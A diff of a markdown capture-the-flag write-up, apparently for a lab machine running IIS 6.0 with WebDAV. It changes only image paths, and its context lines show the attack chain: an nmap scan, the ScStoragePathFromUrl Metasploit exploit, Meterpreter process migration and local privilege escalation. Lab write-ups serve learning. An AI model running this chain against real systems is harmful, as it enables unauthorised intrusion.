@@ -36,7 +36,7 @@ The initial scan was performed to identify open ports and running services.
 nmap -T4 -A -p- 10.10.10.14
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260812234322.png)
+![](Attachments/Pasted%20image%2020260812234322.png)
 
 | Port | State | Service | Version                 |
 | ---- | ----- | ------- | ----------------------- |
@@ -63,7 +63,7 @@ The presence of WebDAV functionality was particularly important because IIS 6.0 
 
 Opening the website revealed an **“Under Construction”** IIS page.
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813002223.png)
+![](Attachments/Pasted%20image%2020260813002223.png)
 
 Rather than relying only on the webpage, the IIS version was researched for known vulnerabilities.
 ```
@@ -81,7 +81,7 @@ searchsploit ScStoragePathFromUrl
 
 The search identified the **ScStoragePathFromUrl** remote buffer overflow vulnerability.
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813002826.png)
+![](Attachments/Pasted%20image%2020260813002826.png)
 
 Relevant exploits included:
 ```
@@ -100,7 +100,7 @@ Metasploit was started and the relevant exploit was searched:
 search ScStoragePathFromUrl
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813005045.png)
+![](Attachments/Pasted%20image%2020260813005045.png)
 
 The identified module was:
 ```
@@ -109,7 +109,7 @@ exploit/windows/iis/iis_webdav_scstoragepathfromurl
 
 check the options,  the important configuration was:
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813005752.png)
+![](Attachments/Pasted%20image%2020260813005752.png)
 
 set the rhost to `10.10.10.14` and the rest correct 
 
@@ -118,7 +118,7 @@ The available exploit target was:
 Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813010020.png)
+![](Attachments/Pasted%20image%2020260813010020.png)
 
 The exploit was executed with:
 ```
@@ -126,7 +126,7 @@ run
 ```
 The first attempt did not create a session, but a subsequent attempt successfully established a Meterpreter session, try changing the lport(5555 etc).
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813010423.png)
+![](Attachments/Pasted%20image%2020260813010423.png)
 
 ---
 ## 5. Initial Access:
@@ -148,7 +148,7 @@ The process list showed multiple processes running under:
 NT AUTHORITY\NETWORK SERVICE
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011148.png)
+![](Attachments/Pasted%20image%2020260813011148.png)
 
 The Meterpreter session was then migrated into a suitable process:
 
@@ -156,7 +156,7 @@ The Meterpreter session was then migrated into a suitable process:
 migrate 1788
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011326.png)
+![](Attachments/Pasted%20image%2020260813011326.png)
 
 The migration completed successfully.
 However, this account was **not yet SYSTEM**, so further privilege escalation was required.
@@ -180,12 +180,12 @@ post/multi/recon/local_exploit_suggester
 ```
 was selected and configured to use the existing Meterpreter session.
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813011637.png)
+![](Attachments/Pasted%20image%2020260813011637.png)
 
 - set the session 1.
 The suggester identified several possible local privilege-escalation exploits.
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012143.png)
+![](Attachments/Pasted%20image%2020260813012143.png)
 
 Among the results was:
 ```
@@ -204,7 +204,7 @@ The original evidence shows:
 Meterpreter session 2 opened
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012340.png)
+![](Attachments/Pasted%20image%2020260813012340.png)
 
 The system information was then checked:
 
@@ -212,7 +212,7 @@ The system information was then checked:
 sysinfo
 ```
 
-![](../../../../Git%20Repos/Attachments/Pasted%20image%2020260813012418.png)
+![](Attachments/Pasted%20image%2020260813012418.png)
 
 Finally, the current privilege level was verified:
 ```
